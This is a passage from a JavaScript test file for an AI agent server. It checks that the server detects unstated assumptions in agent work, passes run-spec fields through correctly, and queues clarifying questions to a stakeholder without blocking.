    chk("  it reads the tell in: " + s, unqueuedAssumption(s) !== "");
  // The controls. Without these, a detector that returned a truthy value for everything would pass every line above,
  // and every run would end in a nudge the agent cannot satisfy.
  for (const s of ["Saved retention.md with the 24-month period the CEO set.", "Wrote the note and verified it renders.",
                   "", "Done.", "Searched, found three sources, and summarised them."])
    eq("  and stays quiet on: " + JSON.stringify(s), unqueuedAssumption(s), "");
  eq("  it reports WHICH tell it found, so the nudge can quote it", unqueuedAssumption("I assumed 24 months"), "assum");
  // The fixtures above were invented. These two are verbatim from the first live run, and they are the ones that
  // matter: the summary carried NOTHING and the document carried everything. Thirteen green assertions over made-up
  // summaries proved only that the detector works on text I would have written.
  eq("  a real finish summary from the live run is empty of tells", unqueuedAssumption("Done."), "");
  chk("  while the document it wrote is full of them",
      unqueuedAssumption("Shift history is retained for 2 years, a duration selected as a reasonable default and subject to review and potential adjustment based on legal, operational, or regulatory requirements.") !== "");
  {
    const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
    chk("  so the finish guard reads the written work, not only the narration", src.includes("unqueuedAssumption(run.wroteText)"));
    chk("  and something populates it", src.includes("run.wroteText = ((run.wroteText"));
  }
  {
    const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
    const fin = src.slice(src.indexOf('if (next.type === "finish") {'));
    const body = fin.slice(0, fin.indexOf('if (next.type === "escalate")'));
    const code = body.split("\n").filter((l) => !l.trim().startsWith("//")).join("\n");
    chk("  the finish handler consults it", code.includes("unqueuedAssumption(next.summary)"));
    chk("  nudges at most once per run", code.includes("!run._qNudged") && code.includes("run._qNudged = true"));
    chk("  the hedge-word path goes quiet once anything has been queued", code.includes("(run.questions || []).length ?"));
    chk("  but a specifically-named unaddressed decision is still chased", code.includes("pending.length || tell"));
  }
}
console.log("# beginRun plumbs every run-spec field the code branches on");
{
  // A live run found that `investigate:false` did nothing: runGated documented the opt-out, the condition tested for
  // it, and beginRun never read it — so documentation, condition and tests all agreed with each other and none of them
  // agreed with the code that builds the run. This is that class of bug caught mechanically instead.
  const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
  const start = src.indexOf("function beginRun(spec) {");
  const init = src.slice(start, src.indexOf("runs.set(run.id, run);", start));
  // The whole function, because a field can be normalized into a local above the object literal (mode is) and the
  // property I care about is not "the literal contains f:" but "beginRun reads it from spec AND puts it on the run".
  const surface = Math.min(src.indexOf("export const runInvestigateFlag"), start);
  const fn = src.slice(surface, src.indexOf("const done = wsStore.run", start));
  chk("  the beginRun initializer was located", start > 0 && init.length > 400);
  // Every field elsewhere in the server that gates behaviour on the RUN object and can only come from the request.
  for (const f of ["objective", "maxTurns", "autoApprove", "dryRun", "hush", "parallel", "investigate", "agentId", "sopId", "goalId", "planItemId", "ws", "mode"])
    chk("  beginRun reads spec." + f + " and puts it on the run", (fn.includes("spec." + f) || fn.includes("spec?." + f)) && (init.includes(f + ":") || init.includes(f + ",")));
  // The control: a field that is NOT a run-spec option must not be found, or the check above passes on any string.
  chk("  and the check can fail — a made-up field passes neither half", !fn.includes("spec.notARealSpecField") && !init.includes("notARealSpecField"));
  chk("  optional chaining counts as a read, which is what the first version of this probe got wrong",
      fn.includes("spec?.investigate") || fn.includes("spec.investigate"));
  eq("  investigate:false is honoured", runInvestigateFlag({ investigate: false }), false);
  eq("  the string \"false\" too, which is what a form sends", runInvestigateFlag({ investigate: "false" }), false);
  eq("  omitting it means 'follow the company guardrail', not 'off'", runInvestigateFlag({}), undefined);
  eq("  and true means the same as omitting it", runInvestigateFlag({ investigate: true }), undefined);
}
console.log("# ask_stakeholder — the decisions the objective never made, derived before any work exists");
{
  // Why this exists: the hedge-word guard only catches an agent that HEDGES. A model that writes "the period is 2
  // years" flat gets no nudge and the question is lost forever. Hedge words were never the signal — the gap is in the
  // objective, and it is there before a single word of work has been written.
  eq("  a well-formed list comes through", normalizeUndecided({ undecided: ["  How long is history kept?  ", "Who owns the licence?"] }),
     ["How long is history kept?", "Who owns the licence?"]);
  eq("  an empty list is a legitimate answer, not a failure", normalizeUndecided({ undecided: [] }), []);
  eq("  and so is a reply with no list at all", normalizeUndecided({}), []);
  eq("  junk does not become a decision", normalizeUndecided({ undecided: ["", null, "  ", "real one"] }), ["real one"]);
  eq("  it caps at four", normalizeUndecided({ undecided: ["a", "b", "c", "d", "e", "f"] }).length, 4);
  eq("  and caps each one", normalizeUndecided({ undecided: ["x".repeat(400)] })[0].length, 160);
  {
    const m = buildUndecidedMsgs("Write a retention note.");
    chk("  the prompt carries the objective", JSON.stringify(m).includes("Write a retention note."));
    chk("  asks only for decisions somebody has to MAKE", m[0].content.includes("only the person who set it can settle"));
    // Without this the model invents gaps to look thorough, and every run ends in a nudge nobody can satisfy.
    chk("  and says plainly that an empty list is the right answer sometimes", /empty list is the RIGHT answer/.test(m[0].content));
  }
}
console.log("# ask_stakeholder — an undecided decision is only addressed once it has been ASKED");
{
  const und = ["How long is shift history kept?", "Who owns the licence?"];
  eq("  with nothing queued, everything is outstanding", unaddressedUndecided({ undecided: und, questions: [] }).length, 2);
  {
    // The agent will not echo the phrasing back, so matching is on significant-word overlap.
    const run = { undecided: und, questions: [{ question: "What retention period for shift history?" }] };
    const left = unaddressedUndecided(run);
    eq("  a question in the agent's own words still counts as asked", left.length, 1);
    chk("  and the one left is the other one", left[0].includes("licence"));
  }
  {
    // The control. Without it, a matcher that cleared everything on any question at all would pass the test above.
    const run = { undecided: und, questions: [{ question: "Should the logo be blue?" }] };
    eq("  an unrelated question clears nothing", unaddressedUndecided(run).length, 2);
  }
  eq("  no derived list means nothing to chase", unaddressedUndecided({ questions: [] }).length, 0);
  {
    const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
    const fin = src.slice(src.indexOf('if (next.type === "finish") {'));
    const body = fin.slice(0, fin.indexOf('if (next.type === "escalate")'));
    const code = body.split("\n").filter((l) => !l.trim().startsWith("//")).join("\n");
    chk("  the finish guard consults the derived list", code.includes("unaddressedUndecided(run)"));
    chk("  and prefers it over the hedge-word tell", code.includes("pending.length || (run.questions || []).length ? \"\""));
    chk("  still at most one nudge", code.includes("!run._qNudged"));
    chk("  the derivation cannot break criteria: it is its own call", src.includes("async function deriveUndecided") && src.includes("catch { return { items: [], tokens: 0 }; }"));
    chk("  and the agent is told about them up front, not only at the end", src.includes("Decisions this objective does NOT settle"));
  }
}
console.log("# ask_stakeholder — it is a safe action, and it is NOT an escalation");
{
  eq("  every alias normalizes to ask_stakeholder",
     ["ask_stakeholder", "ask_ceo", "open_question", "scope_question", "clarify", "flag_assumption"].map((a) => normalizeAction({ actionType: a }).actionType),
     ["ask_stakeholder", "ask_stakeholder", "ask_stakeholder", "ask_stakeholder", "ask_stakeholder", "ask_stakeholder"]);
  chk("  and asking a teammate still means ask_peer", normalizeAction({ actionType: "consult" }).actionType === "ask_peer");
  const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
  const branch = src.slice(src.indexOf('=== "ask_stakeholder") {'));
  const body = branch.slice(0, branch.indexOf('=== "register_finding") {'));
  const code = body.split("\n").filter((l) => !l.trim().startsWith("//")).join("\n");
  chk("  the assertion below is reading the right block", code.includes("recordQuestion(") && code.includes("didExecute = true"));
  chk("  and that block never waits: no approval, no polling, no waiting state",
      !code.includes("latch(") && !code.includes("latchApproval") && !code.includes('"waiting"') && !code.includes("sleep("));
}

console.log(`\n${fail === 0 ? "ALL PASS ✓" : "FAILURES ✗"} — ${pass} passed, ${fail} failed`);

process.exit(fail === 0 ? 0 : 1);
